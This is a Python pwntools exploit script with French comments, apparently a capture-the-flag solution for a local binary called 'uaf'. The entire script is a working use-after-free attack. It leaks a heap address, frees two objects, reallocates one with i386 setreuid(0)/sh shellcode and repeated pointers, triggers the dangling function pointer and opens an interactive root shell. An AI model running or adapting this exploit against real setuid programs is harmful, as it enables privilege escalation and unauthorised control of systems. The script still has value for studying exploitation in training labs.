#!/usr/bin/python3
# coding: utf8
import pwn
from pwn import *
import struct
from pwnlib.util.packing import *
'''
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
'''

p = pwn.process("./uaf")
p.recv()

print("Creation de 2 interfaces...") 

# Create 1st
p.sendline("1")
p.recv()
#name
p.sendline("a")
p.recv()
#ip
p.sendline("a")
p.recv()
#turnon
p.sendline("1")
p.recv()
#save
p.sendline("1")
p.recv()

# Create 2nd
p.sendline("1")
p.recv()
#name
p.sendline("b")
p.recv()
#ip
p.sendline("b")
p.recv()
#turnon
p.sendline("1")
p.recv()
#save
p.sendline("2")
p.recv()

print("Seeking leaked @ now ! ")
p.sendline("4")
text = p.recv()

addr = text[26:34]
import binascii
addr_hex=binascii.unhexlify(addr.hex()).decode('utf8')
print("Adresse turnOn de la struct: %s" % addr_hex) 
addr_buf = int(addr_hex,16)- 92
print("buffer @ = 0x%x" % addr_buf)

print("Destruction des 2 interfaces crees !") 
#destroy
p.sendline("3")
p.recv()
#select
p.sendline("0")
p.recv()
#interface a
p.sendline("1")
p.recv()
#destroy
p.sendline("3")
p.recv()

print("creation de la 3eme interface...")
# Create 3rd
p.sendline("1")
p.recv()
#name
p.sendline("c")
p.recv()


print("Insertion du shellcode dans le champs ip pour copie dans inter 2 via strndup")
context.update(arch='i386', os='linux')
#shell + 3 nop+ 10*4@
#rq: shellcode variant => use nop to align/ verfi size ecrasement
shellcode = shellcraft.setreuid(0)+shellcraft.sh() + (shellcraft.nop()*3)
print(shellcode)
shellcode = asm(shellcode) 
shellcode +=(pwnlib.util.packing.p32(addr_buf, endian='little')*10)
print(hexdump(shellcode))
#p.send(shellcode)
p.sendline(shellcode)
p.recv()
#turnon
p.sendline("1")
p.recv()
#save
p.sendline("3")
p.recv()

print("trying...")
#p.interactive()
p.sendline("0")
p.recv()
p.sendline("2")
p.recv()
p.sendline("2")
#print(p.recv())

p.interactive()
